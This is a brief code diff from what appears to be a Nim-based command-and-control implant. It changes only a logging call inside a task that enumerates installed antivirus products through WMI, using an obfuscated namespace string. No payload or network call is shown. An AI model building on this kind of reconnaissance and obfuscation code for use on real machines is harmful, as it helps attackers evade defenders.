@@ -10,7 +10,7 @@ proc getAv*(taskId: string, params: JsonNode): JsonNode =
   ## Get antivirus products on the machine via WMI (Windows only)
   when defined(windows):
     try:
-      debug "[DEBUG] Querying WMI for antivirus products"
+      debugLog "get_av", "Querying WMI for antivirus products"
       
       var avList: string = ""
       let wmisec = GetObject(obf(r"winmgmts:{impersonationLevel=impersonate}!\\.\root\securitycenter2"))
